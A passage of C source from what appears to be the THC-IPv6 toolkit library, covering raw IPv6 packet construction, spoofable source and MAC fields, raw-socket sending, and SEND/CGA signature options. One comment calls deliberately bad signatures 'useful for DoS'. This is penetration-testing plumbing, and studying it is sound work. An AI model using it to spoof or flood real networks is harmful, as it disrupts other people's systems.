        memcpy(&hdr->pkt[0], do_hdr, do_hdr_size);
        hdr->pkt[18 + do_hdr_off] = (*pkt_len + 2) / 256;
        hdr->pkt[19 + do_hdr_off] = (*pkt_len + 2) % 256;
      } else if (do_6in4) {  // 6in4
        do_hdr[16 + do_hdr_off] = (*pkt_len + 20) / 256;
        do_hdr[17 + do_hdr_off] = (*pkt_len + 20) % 256;
        // hdrchecksum
        i = calculate_checksum(do_hdr + 14 + do_hdr_off, 20);
        memcpy(&hdr->pkt[0], do_hdr, do_hdr_size);
        hdr->pkt[24 + do_hdr_off] = i / 256;
        hdr->pkt[25 + do_hdr_off] = i % 256;
      } else {
        memcpy(&hdr->pkt[0], do_hdr, do_hdr_size);
      }
      offset += do_hdr_size;
      hdr->pkt_len += offset;
      *pkt_len += offset;
    } else {
      offset += 14;
      hdr->pkt_len += offset;
      *pkt_len += offset;

      if (srcmac == NULL)
        mysrcmac = thc_get_own_mac(interface);
      else
        mysrcmac = srcmac;

      if (dstmac == NULL)
        mydstmac = thc_get_mac(interface, hdr->src, hdr->dst);
      else
        mydstmac = dstmac;

      if (mysrcmac == NULL || mydstmac == NULL) {
        if (_thc_ipv6_showerrors)
          fprintf(stderr, "Error: could not get target MAC address\n");
        if (mysrcmac != NULL && srcmac == NULL) free(mysrcmac);
        if (mydstmac != NULL && dstmac == NULL) free(mydstmac);
        return -1;
      }

      memset(hdr->pkt, 0, *pkt_len);
      memcpy(&hdr->pkt[0], mydstmac, 6);
      memcpy(&hdr->pkt[6], mysrcmac, 6);
      hdr->pkt[12] = IPV6_FRAME_TYPE / 256;
      hdr->pkt[13] = IPV6_FRAME_TYPE % 256;
    }
  }

  hdr->pkt[0 + offset] = ((hdr->version % 16) << 4) | (hdr->class / 16);
  hdr->pkt[1 + offset] =
      ((hdr->class % 16) << 4) | ((hdr->label % 1048576) / 65536);
  hdr->pkt[2 + offset] = (hdr->label % 65536) / 256;
  hdr->pkt[3 + offset] = hdr->label % 256;
  hdr->pkt[4 + offset] = hdr->length / 256;
  hdr->pkt[5 + offset] = hdr->length % 256;
  if (hdr->next != NXT_IP4_RUDIMENTARY)
    hdr->pkt[6 + offset] = hdr->next;
  else
    hdr->pkt[6 + offset] = NXT_IP4;
  last_type = &hdr->pkt[7 + offset];
  hdr->pkt[7 + offset] = hdr->ttl;
  memcpy(&hdr->pkt[8 + offset], hdr->src, 16);
  memcpy(&hdr->pkt[24 + offset], hdr->dst, 16);

  next = hdr->next_segment;
  type = hdr->next;
  bufptr = 40 + offset;
  checksum_src = hdr->original_src;

  // here go extension headers (not icmp6, tcp, udp, pim, etc.)
  // BUT ipv4 yes, but not IP4_RUDIMENTARY
  while (type == NXT_HDR || type == NXT_ROUTE || type == NXT_FRAG ||
         type == NXT_OPTS || type == NXT_INVALID || type == NXT_IGNORE ||
         type == NXT_AH || type == NXT_ESP || type == NXT_IP4 ||
         type == NXT_IP6) {
    if (type != NXT_IP4 && type != NXT_IP6) {
      ehdr = (thc_ipv6_ext_hdr *)next;
      if (ehdr->next != NXT_IP4_RUDIMENTARY)
        hdr->pkt[bufptr] = ehdr->next;
      else
        hdr->pkt[bufptr] = NXT_IP4;
      hdr->pkt[bufptr + 1] = ehdr->length;
      last_type = &hdr->pkt[bufptr];
      if (ehdr->data != NULL && ehdr->data_len > 0) {
        memcpy(&hdr->pkt[bufptr + 2], ehdr->data, ehdr->data_len);
        if (type == NXT_OPTS &&
            hdr->pkt[bufptr + 2] == 0xc9) {  // mobile home address option
          checksum_src = &hdr->pkt[bufptr + 4];
        }
      }
      bufptr += 2 + ehdr->data_len;
      next = ehdr->next_segment;
      type = ehdr->next;
    } else {
      if (type == NXT_IP4) {
        is_ip4 = bufptr;
        printf("NXT_IP4 NOT IMPLEMENTED\n");  // to be filled XXX TODO FIXME

      } else if (type == NXT_IP6) {
        printf("NXT_IP6 NOT IMPLEMENTED");  // to be filled XXX TODO FIXME
      }
    }
  }

  // now the rest of protocols that are final destinations
  switch (type) {
    case NXT_NONXT:
      break;
    case NXT_PIM:
      ehdr = (thc_ipv6_ext_hdr *)next;
      memcpy(&hdr->pkt[bufptr], ehdr->data, ehdr->data_len);
      hdr->pkt[bufptr + 2] = 0;
      hdr->pkt[bufptr + 3] = 0;
      do_checksum =
          checksum_pseudo_header(checksum_src, hdr->final_dst, NXT_PIM,
                                 &hdr->pkt[bufptr], ehdr->data_len);
      hdr->pkt[bufptr + 2] = do_checksum / 256;
      hdr->pkt[bufptr + 3] = do_checksum % 256;
      bufptr += ehdr->data_len;
      break;
    case NXT_ICMP6:
      ihdr = (thc_icmp6_hdr *)next;
      if (ihdr->checksum == DO_CHECKSUM) {
        ihdr->checksum = 0;
        do_checksum = 1;
      }
      hdr->pkt[bufptr] = ihdr->type;
      hdr->pkt[bufptr + 1] = ihdr->code;
      hdr->pkt[bufptr + 2] = ihdr->checksum / 256;
      hdr->pkt[bufptr + 3] = ihdr->checksum % 256;
      hdr->pkt[bufptr + 4] = ihdr->flags / 16777216;
      hdr->pkt[bufptr + 5] = (ihdr->flags % 16777216) / 65536;
      hdr->pkt[bufptr + 6] = (ihdr->flags % 65536) / 256;
      hdr->pkt[bufptr + 7] = ihdr->flags % 256;
      if (ihdr->data != NULL && ihdr->data_len > 0)
        memcpy(&hdr->pkt[bufptr + 8], ihdr->data, ihdr->data_len);
      if (do_checksum) {
        // memcpy( hdr->final_dst, hdr->pkt + 38, 16);
        ihdr->checksum =
            checksum_pseudo_header(checksum_src, hdr->final_dst, NXT_ICMP6,
                                   &hdr->pkt[bufptr], 8 + ihdr->data_len);

        /*
        printf("\n");
        thc_dump_data((unsigned char *)hdr->pkt + 22, 16,"packet     source");
        thc_dump_data((unsigned char *)checksum_src, 16, "original   source");
        thc_dump_data((unsigned char *)hdr->final_dst, 16,    "final
        destination"); thc_dump_data((unsigned char *)hdr->pkt + 38, 16,    "pkt
        destination"); printf("\n");
        */
        hdr->pkt[bufptr + 2] = ihdr->checksum / 256;
        hdr->pkt[bufptr + 3] = ihdr->checksum % 256;
        do_checksum = 0;
      }
      bufptr += 8 + ihdr->data_len;
      break;
    case NXT_TCP:
      thdr = (thc_tcp_hdr *)next;
      if (thdr->checksum == DO_CHECKSUM) {
        thdr->checksum = 0;
        do_checksum = 1;
      }
      hdr->pkt[bufptr] = thdr->sport / 256;
      hdr->pkt[bufptr + 1] = thdr->sport % 256;
      hdr->pkt[bufptr + 2] = thdr->dport / 256;
      hdr->pkt[bufptr + 3] = thdr->dport % 256;
      hdr->pkt[bufptr + 4] = thdr->sequence / 16777216;
      hdr->pkt[bufptr + 5] = (thdr->sequence % 16777216) / 65536;
      hdr->pkt[bufptr + 6] = (thdr->sequence % 65536) / 256;
      hdr->pkt[bufptr + 7] = thdr->sequence % 256;
      hdr->pkt[bufptr + 8] = thdr->ack / 16777216;
      hdr->pkt[bufptr + 9] = (thdr->ack % 16777216) / 65536;
      hdr->pkt[bufptr + 10] = (thdr->ack % 65536) / 256;
      hdr->pkt[bufptr + 11] = thdr->ack % 256;
      hdr->pkt[bufptr + 12] = thdr->length;
      hdr->pkt[bufptr + 13] = thdr->flags;
      hdr->pkt[bufptr + 14] = thdr->window % 256;
      hdr->pkt[bufptr + 15] = thdr->window / 256;
      hdr->pkt[bufptr + 18] = thdr->urgent % 256;
      hdr->pkt[bufptr + 19] = thdr->urgent / 256;

      if (thdr->option != NULL && thdr->option_len > 0)
        memcpy(&hdr->pkt[bufptr + 20], thdr->option, thdr->option_len);
      if (thdr->data != NULL && thdr->data_len > 0)
        memcpy(&hdr->pkt[bufptr + 20 + thdr->option_len], thdr->data,
               thdr->data_len);
      if (do_checksum) {
        // memcpy( hdr->final_dst, hdr->pkt + 38, 16);
        thdr->checksum = checksum_pseudo_header(
            checksum_src, hdr->final_dst, NXT_TCP, &hdr->pkt[bufptr],
            20 + thdr->option_len + thdr->data_len);

        /*
        printf("\n");
        thc_dump_data((unsigned char *)hdr->pkt + 22, 16,"packet     source");
        thc_dump_data((unsigned char *)checksum_src, 16, "original   source");
        thc_dump_data((unsigned char *)hdr->final_dst, 16,    "final
        destination"); thc_dump_data((unsigned char *)hdr->pkt + 38, 16,    "pkt
        destination"); printf("\n");
        */
        hdr->pkt[bufptr + 16] = thdr->checksum / 256;
        hdr->pkt[bufptr + 17] = thdr->checksum % 256;
        do_checksum = 0;
      }
      bufptr += 20 + thdr->option_len + thdr->data_len;

      break;
    case NXT_IP4_RUDIMENTARY:
      memcpy(hdr->pkt + bufptr, next, THC_IPv4_RUDIMENTARY_LEN);
      bufptr += THC_IPv4_RUDIMENTARY_LEN;
      break;
    case NXT_UDP:
      uhdr = (thc_udp_hdr *)next;
      if (uhdr->checksum == DO_CHECKSUM) {
        uhdr->checksum = 0;
        do_checksum = 1;
      }
      hdr->pkt[bufptr] = uhdr->sport / 256;
      hdr->pkt[bufptr + 1] = uhdr->sport % 256;
      hdr->pkt[bufptr + 2] = uhdr->dport / 256;
      hdr->pkt[bufptr + 3] = uhdr->dport % 256;
      hdr->pkt[bufptr + 4] = uhdr->length / 256;
      hdr->pkt[bufptr + 5] = uhdr->length % 256;

      if (uhdr->data != NULL && uhdr->data_len > 0)
        memcpy(&hdr->pkt[bufptr + 8], uhdr->data, uhdr->data_len);
      if (do_checksum) {
        // memcpy( hdr->final_dst, hdr->pkt + 38, 16);
        uhdr->checksum =
            checksum_pseudo_header(checksum_src, hdr->final_dst, NXT_UDP,
                                   &hdr->pkt[bufptr], 8 + uhdr->data_len);

        /*
        printf("\n");
        thc_dump_data((unsigned char *)hdr->pkt + 22, 16,"packet     source");
        thc_dump_data((unsigned char *)checksum_src, 16, "original   source");
        thc_dump_data((unsigned char *)hdr->final_dst, 16,    "final
        destination"); thc_dump_data((unsigned char *)hdr->pkt + 38, 16,    "pkt
        destination"); printf("\n");
        */
        hdr->pkt[bufptr + 6] = uhdr->checksum / 256;
        hdr->pkt[bufptr + 7] = uhdr->checksum % 256;
        do_checksum = 0;
      }
      bufptr += 8 + uhdr->data_len;

      break;
    case NXT_DATA:
      ehdr = (thc_ipv6_ext_hdr *)next;
      memcpy(&hdr->pkt[bufptr], ehdr->data, ehdr->data_len);
      if (ehdr->next == NXT_MIPV6) {
        do_checksum =
            checksum_pseudo_header(checksum_src, hdr->final_dst, NXT_MIPV6,
                                   &hdr->pkt[bufptr], ehdr->data_len);
        hdr->pkt[bufptr + 4] = do_checksum / 256;
        hdr->pkt[bufptr + 5] = do_checksum % 256;
      }
      bufptr += ehdr->data_len;
      *last_type = ehdr->next;
      break;

      // XXX TODO FIXME: other protocols

    default:
      if (_thc_ipv6_showerrors)
        fprintf(stderr, "Error: Data packet type %d not implemented!\n", type);
      if (srcmac == NULL) free(mysrcmac);
      if (dstmac == NULL) free(mydstmac);
      return -1;
  }

  if (bufptr != *pkt_len)
    if (_thc_ipv6_showerrors)
      fprintf(stderr, "Warning: packet size mismatch (%d != %d)!\n", *pkt_len,
              bufptr);

  if (debug) thc_dump_data(hdr->pkt, *pkt_len, "Generated Packet");
  if (srcmac == NULL && mysrcmac != NULL) free(mysrcmac);
  if (dstmac == NULL && mydstmac != NULL) free(mydstmac);
  if (debug) printf("Returning from thc_generate_pkt()\n");

  return 0;
}

int thc_send_pkt(char *interface, unsigned char *pkt, int *pkt_len) {
  struct thcsockaddr sa;
  thc_ipv6_hdr *     hdr = (thc_ipv6_hdr *)pkt;

  if (pkt == NULL || hdr->pkt == NULL || hdr->pkt_len < 1 ||
      hdr->pkt_len > 65535)
    return -2;

  if (interface == NULL) interface = default_interface;
  /* else
     if (_thc_ipv6_showerrors && strlen(interface) > 13)
     fprintf(stderr, "Warning: the socket interface used does not support long
     interface names!\n"); strcpy(sa.sa_data, interface);  */

  if (thc_socket < 0) thc_socket = thc_open_ipv6(interface);

  if (thc_socket < 0 && geteuid() != 0) {
    fprintf(stderr, "Error: Program must be run as root.\n");
    exit(-1);
  }

  if (debug) thc_dump_data(hdr->pkt, hdr->pkt_len, "Sent Packet");

  if ((_thc_ipv6_rawmode > 0 && hdr->pkt_len > thc_get_mtu(interface)) ||
      (_thc_ipv6_rawmode == 0 && hdr->pkt_len > thc_get_mtu(interface) + 14)) {
    if (_thc_ipv6_showerrors)
      fprintf(
          stderr,
          "Warning: packet size is larger than MTU of interface (%d > %d)!\n",
          hdr->pkt_len, thc_get_mtu(interface));
    if (thc_get_mtu(interface) == -1) {
      if (_thc_ipv6_showerrors) fprintf(stderr, "Error: interface invalid\n");
      exit(-1);
    }
  }

  return send(thc_socket, hdr->pkt, hdr->pkt_len, 0);
  // return sendto(thc_socket, hdr->pkt, hdr->pkt_len, 0, (struct sockaddr*)&sa,
  // sizeof(sa));
}

int thc_generate_and_send_pkt(char *interface, unsigned char *srcmac,
                              unsigned char *dstmac, unsigned char *pkt,
                              int *pkt_len) {
  if (thc_generate_pkt(interface, srcmac, dstmac, pkt, pkt_len)) return -1;
  while (thc_send_pkt(interface, pkt, pkt_len) == -1)
    usleep(1);
  return 0;
}

unsigned char *thc_destroy_packet(unsigned char *pkt) {
  char *            ptrs[16375];
  int               iptr = 0;
  char *            next;
  int               type;
  thc_ipv6_hdr *    hdr = (thc_ipv6_hdr *)pkt;
  thc_ipv6_ext_hdr *ehdr;
  thc_icmp6_hdr *   ihdr;
  thc_tcp_hdr *     thdr;
  thc_udp_hdr *     uhdr;

  ptrs[iptr] = pkt;
  iptr++;
  next = hdr->next_segment;
  type = hdr->next;

  if (hdr->pkt != NULL) free(hdr->pkt);

  while (type == NXT_HDR || type == NXT_ROUTE || type == NXT_FRAG ||
         type == NXT_OPTS || type == NXT_INVALID || type == NXT_IGNORE ||
         type == NXT_AH || type == NXT_ESP) {
    ehdr = (thc_ipv6_ext_hdr *)next;
    ptrs[iptr] = ehdr->data;
    iptr++;
    ptrs[iptr] = (char *)ehdr;
    iptr++;
    next = ehdr->next_segment;
    type = ehdr->next;
  }

  switch (type) {
    case NXT_NONXT:
      break;
    case NXT_ICMP6:
      ihdr = (thc_icmp6_hdr *)next;
      ptrs[iptr] = ihdr->data;
      iptr++;
      ptrs[iptr] = (char *)ihdr;
      iptr++;
      break;
    case NXT_TCP:
      thdr = (thc_tcp_hdr *)next;
      ptrs[iptr] = thdr->option;
      iptr++;
      ptrs[iptr] = thdr->data;
      iptr++;
      ptrs[iptr] = (char *)thdr;
      iptr++;
      break;
    case NXT_UDP:
      uhdr = (thc_udp_hdr *)next;
      ptrs[iptr] = uhdr->data;
      iptr++;
      ptrs[iptr] = (char *)uhdr;
      iptr++;
      break;
    case NXT_IP4_RUDIMENTARY:
      free(next);
      break;
    case NXT_DATA:
      ehdr = (thc_ipv6_ext_hdr *)next;
      ptrs[iptr] = ehdr->data;
      iptr++;
      ptrs[iptr] = (char *)ehdr;
      iptr++;
      break;
    case NXT_PIM:
      ehdr = (thc_ipv6_ext_hdr *)next;
      ptrs[iptr] = ehdr->data;
      iptr++;
      ptrs[iptr] = (char *)ehdr;
      iptr++;
      break;

      // XXX TODO: other protocols

    default:
      if (_thc_ipv6_showerrors)
        fprintf(stderr,
                "Error: Data packet type %d not implemented - some data not "
                "free'ed!\n",
                type);
  }
  ptrs[iptr] = NULL;

  while (iptr >= 0) {
    if (debug) printf("free ptrs[%d]=%p\n", iptr, ptrs[iptr]);
    if (ptrs[iptr] != NULL) free(ptrs[iptr]);
    iptr--;
  }

  return NULL;
}

void thc_dump_data(unsigned char *buf, int len, char *text) {
  unsigned char *p = (unsigned char *)buf;
  unsigned char  lastrow_data[16];
  int            rows = len / 16;
  int            lastrow = len % 16;
  int            i, j;

  if (buf == NULL || len == 0) return;

  if (text != NULL && text[0] != 0) printf("%s (%d bytes):\n", text, len);
  for (i = 0; i < rows; i++) {
    printf("%04hx:  ", i * 16);
    for (j = 0; j < 16; j++) {
      printf("%02x", p[(i * 16) + j]);
      if (j % 2 == 1) printf(" ");
    }
    printf("   [ ");
    for (j = 0; j < 16; j++) {
      if (isprint(p[(i * 16) + j]))
        printf("%c", p[(i * 16) + j]);
      else
        printf(".");
    }
    printf(" ]\n");
  }
  if (lastrow > 0) {
    memset(lastrow_data, 0, sizeof(lastrow_data));
    memcpy(lastrow_data, p + len - lastrow, lastrow);
    printf("%04hx:  ", i * 16);
    for (j = 0; j < lastrow; j++) {
      printf("%02x", p[(i * 16) + j]);
      if (j % 2 == 1) printf(" ");
    }
    while (j < 16) {
      printf("  ");
      if (j % 2 == 1) printf(" ");
      j++;
    }
    printf("   [ ");
    for (j = 0; j < lastrow; j++) {
      if (isprint(p[(i * 16) + j]))
        printf("%c", p[(i * 16) + j]);
      else
        printf(".");
    }
    while (j < 16) {
      printf(" ");
      j++;
    }
    printf(" ]\n");
  }
}

unsigned char *thc_memstr(char *haystack, char *needle, int haystack_length,
                          int needle_length) {
  register int i;

  if (needle_length > haystack_length) return NULL;
  for (i = 0; i <= haystack_length - needle_length; i++)
    if (memcmp(haystack + i, needle, needle_length) == 0) return (haystack + i);
  return NULL;
}

#ifdef _HAVE_SSL

/* Added by willdamn <willdamn@gmail.com> 2006/07 */
thc_key_t *thc_generate_key(int key_len) {
  thc_key_t *key;

  if ((key = (thc_key_t *)malloc(sizeof(thc_key_t))) == NULL) return NULL;

  #if defined(NO_RSA_LEGACY) || OPENSSL_VERSION_NUMBER >= 0x10100000L
  RSA *rsa = RSA_new();

  if (rsa == NULL) {
    free(key);
    return NULL;
  }
  BIGNUM *f4 = BN_new();

  if (f4 == NULL) return NULL;
  if (BN_set_word(f4, RSA_F4) == 0) return NULL;
  if (RSA_generate_key_ex(rsa, key_len, f4, NULL) != 1) {
    free(key);
    unsigned long err = ERR_get_error();

    if (err == 67637368)
      printf("Key size too small. Try with 512 bits at least\n");
    return NULL;
  } else
    key->rsa = rsa;
  #else
  if ((key->rsa = RSA_generate_key(key_len, 65535, NULL, NULL)) == NULL) {
    free(key);
    return NULL;
  }
  key->len = key_len;
  #endif

  return key;
}

thc_cga_hdr *thc_generate_cga(unsigned char *prefix, thc_key_t *key,
                              unsigned char **cga) {
  thc_cga_hdr *  cga_hdr;
  unsigned char  md_value[EVP_MAX_MD_SIZE];
  unsigned char *p, *tmp;
  int            klen, rand_fd, cgasize, ignore = 0;

  if ((cga_hdr = (thc_cga_hdr *)malloc(sizeof(thc_cga_hdr))) == NULL)
    return NULL;

  cga_hdr->type = 11;

  /* prepare CGA paramater */
  /* CGA header & mod_value, prefix, collision_count from CGA parameter */
  cgasize = 29;

  if ((rand_fd = open("/dev/urandom", O_RDONLY)) < 0) {
    if (_thc_ipv6_showerrors) printf("Cannot open source of randomness!\n");
    free(cga_hdr);
    return NULL;
  }
  ignore = read(rand_fd, cga_hdr->modifier, 16);
  close(rand_fd);

  /* DER-encode public key */
  klen = i2d_RSA_PUBKEY(key->rsa, NULL);
  if ((cga_hdr->pub_key = (unsigned char *)malloc(klen)) == NULL) {
    free(cga_hdr);
    return NULL;
  }
  p = cga_hdr->pub_key;
  klen = i2d_RSA_PUBKEY(key->rsa, &p);

  key->len = klen;
  cgasize += klen;
  cga_hdr->collision_cnt = 0;
  memcpy(cga_hdr->prefix, prefix, 8);

  if ((tmp = malloc(cgasize - 4)) == NULL) {
    if (_thc_ipv6_showerrors) perror("tmp malloc ");
    free(cga_hdr);
    return NULL;
  }

  memcpy(tmp, cga_hdr->modifier, 25);
  memcpy(tmp + 25, cga_hdr->pub_key, klen);

  /* compute hash1 */
  SHA1(tmp, cgasize - 4, md_value);
  free(tmp);

  if (cgasize % 8 == 0) {
    cga_hdr->len = cgasize / 8;
    cga_hdr->pad_len = 0;
  } else {
    cga_hdr->len = cgasize / 8 + 1;
    cga_hdr->pad_len = cga_hdr->len * 8 - cgasize;
    cga_hdr->pad = (char *)malloc(cga_hdr->pad_len);
  }

  /* Prepare CGA */
  if ((*cga = (char *)malloc(16)) == NULL) {
    free(cga_hdr);
    return NULL;
  }

  memcpy(*cga, prefix, 8);
  /* add address identifier to cga */
  memcpy(*cga + 8, md_value, 8);
  /* set "U" & "G" bits ; currently sec equals 0 */
  *(*cga + 8) &= 0x1c;
  // XXX BUG TODO FIXME:
  // here must be something missing in will's code.
  // cga is not pointed to by cga_hdr when we return

  return cga_hdr;
}

thc_timestamp_hdr *generate_timestamp(void) {
  thc_timestamp_hdr *timestamp;
  struct timeval     time;

  if ((timestamp = (thc_timestamp_hdr *)calloc(1, sizeof(thc_timestamp_hdr))) ==
      NULL)
    return NULL;
  timestamp->type = 13;
  timestamp->len = 2;
  gettimeofday(&time, NULL);
  timestamp->timeval = bswap_64(time.tv_sec << 16);
  return timestamp;
}

thc_nonce_hdr *generate_nonce(void) {
  thc_nonce_hdr *nonce;

  if ((nonce = (thc_nonce_hdr *)malloc(sizeof(thc_nonce_hdr))) == NULL)
    return NULL;
  nonce->type = 14;
  nonce->nonce[0] = nonce->nonce[3] = 0xa;
  nonce->nonce[1] = nonce->nonce[4] = 0xc;
  nonce->nonce[2] = nonce->nonce[5] = 0xe;
  nonce->len = sizeof(thc_nonce_hdr) / 8;
  return nonce;
}

thc_rsa_hdr *thc_generate_rsa(char *data2sign, int data2sign_len,
                              thc_cga_hdr *cga_hdr, thc_key_t *key) {
  thc_rsa_hdr * rsa_hdr;
  unsigned char md_value[EVP_MAX_MD_SIZE], hash[20];
  int           rsa_hdr_len, sign_len, fd, ignore = 0;

  if ((rsa_hdr = (thc_rsa_hdr *)malloc(sizeof(thc_rsa_hdr))) == NULL)
    return NULL;
  rsa_hdr->type = 12;

  /* compute public key hash */
  SHA1(cga_hdr->pub_key, key->len, md_value);
  memcpy(rsa_hdr->key_hash, md_value, 16);

  /* If cga type tag's unknown set a bad RSA signature, e.g useful for DoS */
  if (data2sign_len > 0)
    SHA1(data2sign, data2sign_len, hash);
  else {
    fd = open("/dev/urandom", O_RDONLY);
    ignore = read(fd, hash, 20);
    close(fd);
  }

  sign_len = RSA_size(key->rsa);
  if ((rsa_hdr->sign = malloc(sign_len)) == NULL) {
    free(rsa_hdr);
    return NULL;
  }
  if (RSA_sign(NID_sha1, hash, 20, rsa_hdr->sign, &sign_len, key->rsa) == 0) {
    if (_thc_ipv6_showerrors)
      printf("Error during generating RSA signature! \n");
    free(rsa_hdr);
    return NULL;
  }
  rsa_hdr_len = 20 + sign_len;
  if (rsa_hdr_len % 8 == 0) {
    rsa_hdr->len = rsa_hdr_len / 8;
    rsa_hdr->pad = NULL;
  } else {
    rsa_hdr->len = rsa_hdr_len / 8 + 1;
    rsa_hdr->pad = malloc(rsa_hdr->len * 8 - rsa_hdr_len);
  }
  return rsa_hdr;
}

int thc_add_send(unsigned char *pkt, int *pkt_len, int type, int code,
                 unsigned int flags, unsigned char *data, int data_len,
                 thc_cga_hdr *cga_hdr, thc_key_t *key, unsigned char *tag,
                 int checksum) {
  thc_ipv6_hdr *     hdr = (thc_ipv6_hdr *)pkt;
  thc_icmp6_hdr *    ihdr = malloc(sizeof(thc_icmp6_hdr));
  thc_ipv6_ext_hdr * ehdr;
  thc_nonce_hdr *    nonce_hdr = NULL;
  thc_timestamp_hdr *timestamp_hdr = NULL;
  thc_rsa_hdr *      rsa_hdr = NULL;
  unsigned char *    ndp_opt_buff, *data2sign = NULL;
  char *             buff;
  int                ndp_opt_len, data2sign_len, offset;

  /* build standard part of ND message */
  if (ihdr == NULL) return -1;
  memset(ihdr, 0, sizeof(thc_icmp6_hdr));

  if (hdr->final != NULL) {
    ehdr = (thc_ipv6_ext_hdr *)hdr->final;
    ehdr->next_segment = (char *)ihdr;
    ehdr->next = NXT_ICMP6;
  } else {
    hdr->next_segment = (char *)ihdr;
    hdr->next = NXT_ICMP6;
  }
  hdr->final = (char *)ihdr;
  hdr->final_type = NXT_ICMP6;

  ihdr->type = type;
  ihdr->code = code;
  ihdr->flags = flags;

  if (checksum == 0) {
    ihdr->checksum = DO_CHECKSUM;
  } else
    ihdr->checksum = checksum;

  if (data_len > 0 && data != NULL)
    ndp_opt_len = data_len;
  else
    ndp_opt_len = 0;

  hdr->length += 8;
  *pkt_len += 8;

  /* add various security features to ND message */
  /* determine options' total length */
  if (cga_hdr == NULL) return -1;

  ndp_opt_len += cga_hdr->len * 8;
  if ((timestamp_hdr = generate_timestamp()) == NULL) return -1;
  ndp_opt_len += timestamp_hdr->len * 8;
  if ((nonce_hdr = generate_nonce()) == NULL) {
    free(timestamp_hdr);
    return -1;
  }
  ndp_opt_len += nonce_hdr->len * 8;

  /* create options buffer */
  if ((ndp_opt_buff = (char *)malloc(ndp_opt_len)) == NULL) {
    free(timestamp_hdr);
    free(nonce_hdr);
    return -1;
  }

  offset = 0;
  if (data != NULL) {
    memcpy(ndp_opt_buff + offset, data, data_len);
    offset += data_len;
  }

  /* CGA option */
  memcpy(ndp_opt_buff + offset, cga_hdr, 29);
  memcpy(ndp_opt_buff + offset + 29, cga_hdr->pub_key, key->len);
  offset += (cga_hdr->len * 8);
  /* timestamp option */
  memcpy(ndp_opt_buff + offset, timestamp_hdr, timestamp_hdr->len * 8);
  offset += timestamp_hdr->len * 8;
  free(timestamp_hdr);
  /* nonce option */
  memcpy(ndp_opt_buff + offset, nonce_hdr, nonce_hdr->len * 8);
  offset += nonce_hdr->len * 8;
  free(nonce_hdr);

  /* RSA signature
   * If CGA message type tag given compute correct RSA signature
   * otherwise set option with incorrect one */
  if (tag != NULL) {
    data2sign_len = 52 + ndp_opt_len;
    if ((data2sign = (char *)malloc(data2sign_len)) == NULL) {
      free(ndp_opt_buff);
      return -1;
    }
    memcpy(data2sign, tag, 16);
    memcpy(data2sign + 16, hdr->src, 16);
    memcpy(data2sign + 32, hdr->dst, 16);

    /* compute icmp checksum that is needed to compute rsa signature */
    if ((buff = malloc(8 + ndp_opt_len)) == NULL) {
      free(data2sign);
      free(ndp_opt_buff);
      return -1;
    }
    memcpy(buff, ihdr, 8);
    memcpy(buff + 8, ndp_opt_buff, ndp_opt_len);
    ihdr->checksum = checksum_pseudo_header(hdr->src, hdr->dst, NXT_ICMP6, buff,
                                            8 + ndp_opt_len);
    free(buff);
    memcpy(data2sign + 48, &ihdr->type, 4);
    ihdr->checksum = 0;
    memcpy(data2sign + 52, ndp_opt_buff, ndp_opt_len);
  } else
    data2sign_len = -1;

  if ((rsa_hdr = thc_generate_rsa(data2sign, data2sign_len, cga_hdr, key)) ==
      NULL) {
    free(ndp_opt_buff);
    free(data2sign);
    return -1;
  }
  ihdr->data_len = ndp_opt_len + rsa_hdr->len * 8;
  free(data2sign);

  /* create 'real' buffer for NDP options */
  if ((ihdr->data = (unsigned char *)malloc(ihdr->data_len)) == NULL) {
    free(ndp_opt_buff);
    free(rsa_hdr);
    return -1;
  }
  memcpy(ihdr->data, ndp_opt_buff, ndp_opt_len);
  free(ndp_opt_buff);

  /* RSA signature option */
  memcpy(ihdr->data + ndp_opt_len, rsa_hdr, 20);
  memcpy(ihdr->data + ndp_opt_len + 20, rsa_hdr->sign, rsa_hdr->len * 8 - 20);
  hdr->length += ihdr->data_len;
  *pkt_len += ihdr->data_len;
  free(rsa_hdr);
  return 0;
}

#endif

int thc_bind_udp_port(int port) {
  int on = 1, s;

  /*  int fromlen, error;
    struct ipv6_mreq mreq6;
    static struct iovec iov;
    struct sockaddr_storage from;
    struct msghdr mhdr;*/
  struct addrinfo hints, *res;
  char            pbuf[16];

  memset(&hints, 0, sizeof(hints));
  hints.ai_family = AF_INET6;
  hints.ai_socktype = SOCK_DGRAM;
  hints.ai_protocol = IPPROTO_UDP;
  hints.ai_flags = AI_PASSIVE;
  snprintf(pbuf, sizeof(pbuf), "%d", port);
  if (getaddrinfo(NULL, pbuf, &hints, &res) < 0) return -1;
  if ((s = socket(res->ai_family, res->ai_socktype, res->ai_protocol)) < 0)
    return -1;
#ifdef SO_REUSEPORT
  setsockopt(s, SOL_SOCKET, SO_REUSEPORT, &on, sizeof(on));
#endif
#ifdef SO_REUSEADDR
  setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on));
#endif
#ifdef IPV6_PKTINFO
  setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, &on, sizeof(on));
#else
  setsockopt(s, IPPROTO_IPV6, IPV6_RECVPKTINFO, &on, sizeof(on));
#endif
#ifdef IPV6_V6ONLY
  setsockopt(s, IPPROTO_IPV6, IPV6_V6ONLY, &on, sizeof(on));
#endif
  if (bind(s, res->ai_addr, res->ai_addrlen) < 0) {
    close(s);
    return -1;
  }
  freeaddrinfo(res);

  return s;
}

int thc_bind_multicast_to_socket(int s, char *interface, char *src) {
  struct ipv6_mreq mreq6;

  if (src == NULL || interface == NULL || s < 0) return -1;
  memset(&mreq6, 0, sizeof(mreq6));
  mreq6.ipv6mr_interface = if_nametoindex(interface);
  memcpy(&mreq6.ipv6mr_multiaddr, src, 16);
  if (setsockopt(s, IPPROTO_IPV6, IPV6_JOIN_GROUP, &mreq6, sizeof(mreq6)) < 0)
    return -1;
  return 0;
}
